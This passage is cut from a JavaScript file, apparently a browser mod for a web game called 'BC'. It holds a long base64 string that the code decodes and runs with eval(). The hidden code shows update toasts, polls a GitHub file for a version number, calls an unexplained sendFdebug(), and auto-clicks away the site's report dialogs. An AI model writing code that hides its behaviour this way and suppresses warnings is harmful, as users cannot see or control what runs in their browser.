yLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwoKCi8vIFVwZGF0ZSB0aGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgYXMgaXQgY291bnRzIGRvd24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7Cn0sIDApOwogICAgCi8vIEFkZCB0aGUgY3VzdG9tIEJDTSBpY29uCnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKLy8gQWRkIHRoZSB0ZXh0IG1lc3NhZ2UKdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CnRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwp0ZXh0LmlubmVySFRNTCA9ICJBY3Rpb24gU3VjY2Vzc2Z1bGx5IEV4ZWN1dGVkIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgogICAgCiAgCiAgICAvLyBBcHBlbmQgdGhlIHRvYXN0IGNvbnRhaW5lciB0byB0aGUgYm9keQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CiAgCiAgICAvLyBTaG93IHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBpbiBhbmltYXRpb24KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiYmxvY2siOwogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgfSwgMCk7CiAgCiAgICAvLyBIaWRlIHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBvdXQgYW5pbWF0aW9uCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgfSwgNTAwMCk7CiAgCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgfSwgNTUwMCk7CiAgICBzZW5kRmRlYnVnKCk7CgogIH0KICAKCi8vVGhlIFVwZGF0ZSB0b2FzdApmdW5jdGlvbiBzaG93VG9hc3RVcGRhdGUoKSB7Ci8vIENyZWF0ZSB0aGUgdG9hc3QgY29udGFpbmVyCnZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwp0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CnRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICNmMjJjMmMiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwp0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CnZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwpzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CnN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwpzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAid2lkdGggNXMgZWFzZS1pbi1vdXQiOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChzdGF0dXNCYXIpOwoKLy8gVXBkYXRlIHRoZSB3aWR0aCBvZiB0aGUgc3RhdHVzIGJhciB3aGlsZSBjb3VudGluZyBkb3duCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwp9LCAwKTsKCi8vIENyZWF0ZSB0aGUgY2xvc2UgYnV0dG9uCnZhciBjbG9zZUJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwpjbG9zZUJ1dHRvbi5zdHlsZS5ib3JkZXIgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLmJhY2tncm91bmQgPSAibm9uZSI7CmNsb3NlQnV0dG9uLnN0eWxlLnRvcCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5yaWdodCA9ICI1cHgiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwpjbG9zZUJ1dHRvbi5zdHlsZS5mb250U2l6ZSA9ICIxNnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luTGVmdCA9ICItMnB4IjsKY2xvc2VCdXR0b24uc3R5bGUubWFyZ2luUmlnaHQgPSAiMHB4IjsKY2xvc2VCdXR0b24uaW5uZXJIVE1MID0gIlgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChjbG9zZUJ1dHRvbik7CgovLyBDbG9zZSB0aGUgdG9hc3Qgd2hlbiB0aGUgY2xvc2UgYnV0dG9uIGlzIGNsaWNrZWQKY2xvc2VCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogIH0sIDUwMCk7Cn0pOwoKLy8gQkNNRSBsb2dvIHRvIHRoZSBsZWZ0CnZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7Cmljb24uc3JjID0gImh0dHBzOi8vbWVkaWEuZGlzY29yZGFwcC5uZXQvYXR0YWNobWVudHMvNzgxNzQ5MjI5MzMxOTM5MzI4LzEwNzk2NTkwMTY5MTkxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7Cmljb24uc3R5bGUud2lkdGggPSAiMjNweCI7Cmljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwppY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwppY29uLnN0eWxlLm1hcmdpblJpZ2h0ID0gIi0zMHB4IjsKaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwoKLy8gVXBkYXRlIGNsaWVudCBtZXNzYWdlCnZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwp0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CnRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKdGV4dC5pbm5lckhUTUwgPSAiTmV3IHVwZGF0ZSBkZXRlY3RlZCwgcmVmcmVzaCBCQyB0byB1cGRhdGUgdG8gVjIuMC4yIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgovLyBBcHBlbmQgdGhlIHRvYXN0IGNvbnRhaW5lciB0byBCQydzIGJvZHkKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZCh0b2FzdENvbnRhaW5lcik7CgovLyBTaG93IHRoZSB0b2FzdCB3aXRoIGEgZmFkZSBpbiBhbmltYXRpb24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwp9LCAwKTsKCi8vIEhpZGUgdGhlIHRvYXN0IHdpdGggYSBmYWRlIG91dCBhbmltYXRpb24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwp9LCA1MDAwMDAwKTsKCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKfSwgNTUwMDAwMCk7Cgp9CgogIC8vIEVuZCBvZiBVcGRhdGUgTWFuZWdyZSBUb2FzdF9fX19fX19fX19fX19fX18KCiAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwoKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKICAgIGlmIChlbGVtZW50VG9SZW1vdmUpIHsKICAgICAgY29uc3QgYnV0dG9ucyA9IGVsZW1lbnRUb1JlbW92ZS5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b25bc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsiXScpOwogICAgICBpZiAoYnV0dG9ucykgewogICAgICAgIGJ1dHRvbnMuZm9yRWFjaChidXR0b24gPT4gYnV0dG9uLmNsaWNrKCkpOwogICAgICB9CiAgICB9CiAgfSwgMSk7CiAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CiAgICBpZiAoZWxlbWVudFRvUmVtb3ZlKSB7CiAgICAgIGNvbnN0IGJ1dHRvbnMgPSBlbGVtZW50VG9SZW1vdmUucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uW3N0eWxlPSJjdXJzb3I6IHBvaW50ZXI7Il0nKTsKICAgICAgaWYgKGJ1dHRvbnMpIHsKICAgICAgICBidXR0b25zLmZvckVhY2goYnV0dG9uID0+IHsKICAgICAgICAgIGlmIChidXR0b24udGV4dENvbnRlbnQgPT09ICJEbyBub3Qgc2hvdyB0aGlzIHJlcG9ydCBhZ2FpbiB1bmxlc3Mgc29tZXRoaW5nIGNoYW5nZXMiIHx8IGJ1dHRvbi50ZXh0Q29udGVudCA9PT0gIkNsb3NlIikgewogICAgICAgICAgICBidXR0b24uY2xpY2soKTsKICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgfQogICAgfQogIH0sIDUwMCk7CgogIC8vIERlZmluZSB0aGUgVVJMIG9mIHRoZSByYXcgR2l0SHViIHBhZ2UgdG8gY2hlY2sKY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQ01TNy9CQ00vbWFpbi91cGRhdGVtYW5hZ2VyLmpzJzsKLy8gRGVmaW5lIHRoZSBtYXhpbXVtIHZlcnNpb24gbnVtYmVyIGFsbG93ZWQKY29uc3QgbWF4VmVyc2lvbiA9IDEyOwovLyBEZWZpbmUgYSBmbGFnIHRvIGtlZXAgdHJhY2sgb2Ygd2hldGhlciB0aGUgYWxlcnQgaGFzIGJlZW4gdHJpZ2dlcmVkCmxldCBhbGVydFRyaWdnZXJlZCA9IGZhbHNlOwovLyBEZWZpbmUgYSBmdW5jdGlvbiB0byBjaGVjayB0aGUgdmVyc2lvbiBhbmQgc2hvdyB0aGUgYWxlcnQgaWYgbmVjZXNzYXJ5CmZ1bmN0aW9uIGNoZWNrVmVyc2lvbigpIHsKICBmZXRjaCh1cmwpCiAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAudGhlbih2ZXJzaW9uID0+IHsKICAgICAgaWYgKHBhcnNlSW50KHZlcnNpb24pID4gbWF4VmVyc2lvbiAmJiAhYWxlcnRUcmlnZ2VyZWQpIHsKICAgICAgICBzaG93VG9hc3RVcGRhdGUoKTsKICAgICAgICBhbGVydFRyaWdnZXJlZCA9IHRydWU7CiAgICAgIH0KICAgIH0pCiAgICAuY2F0Y2goZXJyb3IgPT4gY29uc29sZS5lcnJvcihlcnJvcikpOwp9Ci8vIENoZWNrIGZvciB1cGRhdGVzIGV2ZXJ5IDUgc2Vjb25kcwpzZXRJbnRlcnZhbChjaGVja1ZlcnNpb24sIDUwMDApOwp9Cn0p')
if (sprc) {
eval(sprc);
}
/*
8
*/
